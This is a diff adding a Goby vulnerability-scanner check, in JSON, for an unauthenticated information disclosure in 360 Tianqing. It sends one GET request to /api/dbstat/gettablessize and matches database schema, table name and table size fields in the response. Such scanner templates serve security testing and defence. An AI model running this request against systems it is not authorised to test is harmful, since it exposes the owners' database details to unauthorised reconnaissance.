@@ -1,0 +1,67 @@
+{
+      "Name": "360 Tianqing database information disclosure",
+      "Level": "0",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "app=\"360-TianQing\"",
+      "Description": "Tianqing has unauthorized unauthorized unauthorized access, resulting in the disclosure of sensitive information",
+      "Product": "360 Tianqing",
+      "Homepage": "https://www.360.cn/",
+      "Author": "PeiQi",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/api/dbstat/gettablessize",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "schema_name",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "table_name",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "table_size",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-08 16:04:28",
+      "GobyVersion": "1.8.255"
+}
